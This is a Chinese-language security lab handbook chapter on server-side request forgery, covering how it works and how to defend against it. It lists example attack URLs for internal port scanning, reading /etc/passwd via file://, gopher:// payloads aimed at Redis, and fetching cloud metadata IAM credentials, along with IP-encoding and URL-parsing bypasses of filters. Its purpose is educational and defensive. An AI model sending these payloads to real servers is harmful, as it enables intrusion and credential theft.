# 🌐 实验手册：SSRF 服务端请求伪造

### 0. 序言
如果 CSRF 是让用户的浏览器帮你干坏事，那 SSRF 就是让服务器帮你干坏事。服务器：我只是想帮你取个网页，怎么就变成内鬼了？

*   **SSRF（Server-Side Request Forgery）**：一种让服务器发起攻击者指定请求的漏洞。
*   **核心思想**：借服务器的"身份"和"网络位置"，访问原本无法触及的资源。

本章目标：**把服务器变成你的代理，窥探内网的秘密。**

---

### 1. SSRF 的工作原理

**攻击本质**：
服务器信任了用户提供的 URL，并代替用户去访问它。

**典型场景**：
```
用户：请帮我获取这个网页的内容 → http://evil.com
服务器：好的，我去取...

用户：请帮我获取这个网页的内容 → http://127.0.0.1:8080/admin
服务器：好的，我去取... 等等，这不对劲...
```

**核心问题**：
服务器往往处于内网中，能访问外部用户无法直接访问的资源。

---

### 2. 内网探测：服务器变身扫描器

**原理**：
利用 SSRF 探测内网存活主机和开放端口。

**攻击示例**：
```
# 探测内网主机
http://target.com/fetch?url=http://192.168.1.1
http://target.com/fetch?url=http://192.168.1.2
...

# 探测端口
http://target.com/fetch?url=http://192.168.1.100:22
http://target.com/fetch?url=http://192.168.1.100:3306
http://target.com/fetch?url=http://192.168.1.100:6379
```

**判断依据**：响应时间、错误信息、返回内容的差异。

---

### 3. 协议滥用：不只是 HTTP

**file:// 协议 - 读取本地文件**：
```
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=file:///C:/Windows/win.ini
```

**gopher:// 协议 - 万能协议**：
```
# 可以构造任意 TCP 数据包
http://target.com/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a...
# 攻击 Redis、MySQL、FastCGI 等
```

**dict:// 协议 - 探测服务**：
```
http://target.com/fetch?url=dict://127.0.0.1:6379/info
```

---

### 4. Cloud Metadata 攻击

**云环境的致命弱点**：
几乎所有云服务商都提供 metadata API，通过特定 IP 访问。

**AWS 示例**：
```
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
可获取 IAM 角色的临时凭证，进而控制整个云账户！

**其他云平台**：
- GCP: `http://metadata.google.internal/`
- Azure: `http://169.254.169.254/metadata/`
- 阿里云: `http://100.100.100.200/`

---

### 5. 绕过技巧速览

**IP 地址变形**：
```
http://127.0.0.1 → http://2130706433 (十进制)
http://127.0.0.1 → http://0x7f000001 (十六进制)
http://127.0.0.1 → http://017700000001 (八进制)
http://127.0.0.1 → http://127.1 (缩写)
```

**DNS Rebinding**：
```
1. 让 evil.com 解析到 1.2.3.4（通过检查）
2. 请求发起时，DNS 已变为 127.0.0.1
```

**URL 解析差异**：
```
http://127.0.0.1@evil.com
http://evil.com#@127.0.0.1
```

---

### 6. 防御措施

**URL 白名单**：
```python
ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.example.com']
if urlparse(user_url).netloc not in ALLOWED_DOMAINS:
    raise SecurityError("Domain not allowed")
```

**禁止内网 IP**：
```python
import ipaddress
def is_internal(ip):
    addr = ipaddress.ip_address(ip)
    return addr.is_private or addr.is_loopback
```

**禁用危险协议**：
只允许 http:// 和 https://，禁止 file://、gopher:// 等。

**使用代理隔离**：
将请求发送功能放在隔离的网络环境中，限制其网络访问能力。

---

### 7. 结语

SSRF 的危险在于它突破了网络边界——攻击者借助服务器的"特权位置"，触达了原本隔离的内部资源。

记住：**服务器不是用户的代理，任何由服务器发起的请求都应该被严格控制。**

---

**[准备好了吗？让服务器替你探索内网吧]**
